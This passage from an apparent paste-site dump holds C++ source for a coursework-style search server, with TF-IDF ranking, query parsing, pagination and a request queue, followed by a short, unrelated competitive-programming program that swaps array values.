        int rating;
        DocumentStatus status;
    };
    const set<string> stop_words_;
    map<string, map<int, double>> word_to_document_freqs_;
    map<int, DocumentData> documents_;
    vector<int> document_ids_;

    bool IsStopWord(const string& word) const {
        return stop_words_.count(word) > 0;
    }

    static bool IsValidWord(const string& word) {
        // A valid word must not contain special characters
        return none_of(word.begin(), word.end(), [](char c) {
            return c >= '\0' && c < ' ';
            });
    }

    vector<string> SplitIntoWordsNoStop(const string& text) const {
        vector<string> words;
        for (const string& word : SplitIntoWords(text)) {
            if (!IsValidWord(word)) {
                throw invalid_argument(""Word ""s + word + "" is invalid""s);
            }
            if (!IsStopWord(word)) {
                words.push_back(word);
            }
        }
        return words;
    }

    static int ComputeAverageRating(const vector<int>& ratings) {
        if (ratings.empty()) {
            return 0;
        }
        int rating_sum = 0;
        for (const int rating : ratings) {
            rating_sum += rating;
        }
        return rating_sum / static_cast<int>(ratings.size());
    }

    struct QueryWord {
        string data;
        bool is_minus;
        bool is_stop;
    };

    QueryWord ParseQueryWord(const string& text) const {
        if (text.empty()) {
            throw invalid_argument(""Query word is empty""s);
        }
        string word = text;
        bool is_minus = false;
        if (word[0] == '-') {
            is_minus = true;
            word = word.substr(1);
        }
        if (word.empty() || word[0] == '-' || !IsValidWord(word)) {
            throw invalid_argument(""Query word ""s + text + "" is invalid"");
        }

        return { word, is_minus, IsStopWord(word) };
    }

    struct Query {
        set<string> plus_words;
        set<string> minus_words;
    };

    Query ParseQuery(const string& text) const {
        Query result;
        for (const string& word : SplitIntoWords(text)) {
            const auto query_word = ParseQueryWord(word);
            if (!query_word.is_stop) {
                if (query_word.is_minus) {
                    result.minus_words.insert(query_word.data);
                }
                else {
                    result.plus_words.insert(query_word.data);
                }
            }
        }
        return result;
    }

    // Existence required
    double ComputeWordInverseDocumentFreq(const string& word) const {
        return log(GetDocumentCount() * 1.0 / word_to_document_freqs_.at(word).size());
    }

    template <typename DocumentPredicate>
    vector<Document> FindAllDocuments(const Query& query, DocumentPredicate document_predicate) const {
        map<int, double> document_to_relevance;
        for (const string& word : query.plus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            const double inverse_document_freq = ComputeWordInverseDocumentFreq(word);
            for (const auto& [document_id, term_freq] : word_to_document_freqs_.at(word)) {
                const auto& document_data = documents_.at(document_id);
                if (document_predicate(document_id, document_data.status, document_data.rating)) {
                    document_to_relevance[document_id] += term_freq * inverse_document_freq;
                }
            }
        }

        for (const string& word : query.minus_words) {
            if (word_to_document_freqs_.count(word) == 0) {
                continue;
            }
            for (const auto& [document_id, _] : word_to_document_freqs_.at(word)) {
                document_to_relevance.erase(document_id);
            }
        }

        vector<Document> matched_documents;
        for (const auto& [document_id, relevance] : document_to_relevance) {
            matched_documents.push_back({ document_id, relevance, documents_.at(document_id).rating });
        }
        return matched_documents;
    }
};

void PrintDocument(const Document& document) {
    cout << ""{ ""s
        << ""document_id = ""s << document.id << "", ""s
        << ""relevance = ""s << document.relevance << "", ""s
        << ""rating = ""s << document.rating << "" }""s << endl;
}

void PrintMatchDocumentResult(int document_id, const vector<string>& words, DocumentStatus status) {
    cout << ""{ ""s
        << ""document_id = ""s << document_id << "", ""s
        << ""status = ""s << static_cast<int>(status) << "", ""s
        << ""words =""s;
    for (const string& word : words) {
        cout << ' ' << word;
    }
    cout << ""}""s << endl;
}

void AddDocument(SearchServer& search_server, int document_id, const string& document, DocumentStatus status,
    const vector<int>& ratings) {
    try {
        search_server.AddDocument(document_id, document, status, ratings);
    }
    catch (const invalid_argument& e) {
        cout << ""Ошибка добавления документа ""s << document_id << "": ""s << e.what() << endl;
    }
}

void FindTopDocuments(const SearchServer& search_server, const string& raw_query) {
    cout << ""Результаты поиска по запросу: ""s << raw_query << endl;
    try {
        for (const Document& document : search_server.FindTopDocuments(raw_query)) {
            PrintDocument(document);
        }
    }
    catch (const invalid_argument& e) {
        cout << ""Ошибка поиска: ""s << e.what() << endl;
    }
}

void MatchDocuments(const SearchServer& search_server, const string& query) {
    try {
        cout << ""Матчинг документов по запросу: ""s << query << endl;
        const int document_count = search_server.GetDocumentCount();
        for (int index = 0; index < document_count; ++index) {
            const int document_id = search_server.GetDocumentId(index);
            const auto [words, status] = search_server.MatchDocument(query, document_id);
            PrintMatchDocumentResult(document_id, words, status);
        }
    }
    catch (const invalid_argument& e) {
        cout << ""Ошибка матчинга документов на запрос ""s << query << "": ""s << e.what() << endl;
    }
}

template <typename Iterator>
class IteratorRange {
public:
    IteratorRange(Iterator begin, Iterator end)
        : first_(begin)
        , last_(end)
        , size_(distance(first_, last_)) {
    }

    Iterator begin() const {
        return first_;
    }

    Iterator end() const {
        return last_;
    }

    size_t size() const {
        return size_;
    }

private:
    Iterator first_, last_;
    size_t size_;
};

template <typename Iterator>
ostream& operator<<(ostream& out, const IteratorRange<Iterator>& range) {
    for (Iterator it = range.begin(); it != range.end(); ++it) {
        out << *it;
    }
    return out;
}

template <typename Iterator>
class Paginator {
public:
    Paginator(Iterator begin, Iterator end, size_t page_size) {
        for (size_t left = distance(begin, end); left > 0;) {
            const size_t current_page_size = min(page_size, left);
            auto current_page_end = next(begin, current_page_size);
            pages_.push_back({ begin, current_page_end });

            left -= current_page_size;
            begin = current_page_end;
        }
    }

    auto begin() const {
        return pages_.begin();
    }

    auto end() const {
        return pages_.end();
    }

    size_t size() const {
        return pages_.size();
    }

private:
    vector<IteratorRange<Iterator>> pages_;
};

template <typename Container>
auto Paginate(const Container& c, size_t page_size) {
    return Paginator(begin(c), end(c), page_size);
}

class RequestQueue {
public:
    explicit RequestQueue(const SearchServer& search_server)
        : search_server_(search_server), count_request_(0) {
    }

    // сделаем ""обертки"" для всех методов поиска, чтобы сохранять результаты для нашей статистики
    template <typename DocumentPredicate>
    vector<Document> AddFindRequest(const string& raw_query, DocumentPredicate document_predicate) {
        const auto result = search_server_.FindTopDocuments(raw_query, document_predicate);
        AddRequest(result.size());
        return result;
    }

    vector<Document> AddFindRequest(const string& raw_query, DocumentStatus status) {

        const auto result = search_server_.FindTopDocuments(raw_query, status);
        AddRequest(result.size());
        return result;
    }

    vector<Document> AddFindRequest(const string& raw_query) {

        const auto result = search_server_.FindTopDocuments(raw_query);
        AddRequest(result.size());
        return result;
    }
     
    int GetNoResultRequests() const {
        return min_in_day_ - count_request_;
    }

private:
    struct QueryResult {
        int req;
        uint64_t timestamp;
    };
    deque<QueryResult> requests_;
    const SearchServer& search_server_;
    int count_request_ = 0;
    uint64_t current_time_ = 0;
    const static int min_in_day_ = 1440;
    

    void AddRequest(int num_request) {
        if (num_request != 0) 
        {
            ++current_time_;
            ++count_request_;
            requests_.push_back({num_request, current_time_});
        }  
    }
};

int main() {
    setlocale(0, """");
    SearchServer search_server(""and in at""s);
    RequestQueue request_queue(search_server);
    search_server.AddDocument(1, ""curly cat curly tail""s, DocumentStatus::ACTUAL, { 7, 2, 7 });
    search_server.AddDocument(2, ""curly dog and fancy collar""s, DocumentStatus::ACTUAL, { 1, 2, 3 });
    search_server.AddDocument(3, ""big cat fancy collar ""s, DocumentStatus::ACTUAL, { 1, 2, 8 });
    search_server.AddDocument(4, ""big dog sparrow Eugene""s, DocumentStatus::ACTUAL, { 1, 3, 2 });
    search_server.AddDocument(5, ""big dog sparrow Vasiliy""s, DocumentStatus::ACTUAL, { 1, 1, 1 });
    // 1439 запросов с нулевым результатом
    for (int i = 0; i < 1439; ++i) {
        request_queue.AddFindRequest(""empty request""s);
    }
    // все еще 1439 запросов с нулевым результатом
    request_queue.AddFindRequest(""curly dog""s);
    // новые сутки, первый запрос удален, 1438 запросов с нулевым результатом
    request_queue.AddFindRequest(""big collar""s);
    // первый запрос удален, 1437 запросов с нулевым результатом
    request_queue.AddFindRequest(""sparrow""s);
    cout << ""Total empty requests: ""s << request_queue.GetNoResultRequests() << endl;
    return 0;
}
"
yv2heFF7,Untitled,Josif_tepe,C++,Thursday 7th of March 2024 09:57:04 AM CDT,"#include <iostream>
#include <set>
//#include <bits/stdc++.h>

using namespace std;


int main() {
    ios_base::sync_with_stdio(false);
    int n, k;
    cin >> n >> k;
    int niza[n];
    vector<pair<int, int>> v;
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
        v.push_back(make_pair(niza[i], i));
    }
    sort(v.begin(), v.end());
    for(int i = 0; i < k; i++) {
        swap(niza[v[i].second], niza[v[n - i - 1].second]);
    }
    for(int i = 0; i < n; i++) {
        cout << niza[i] << "" "";
    }
}
"
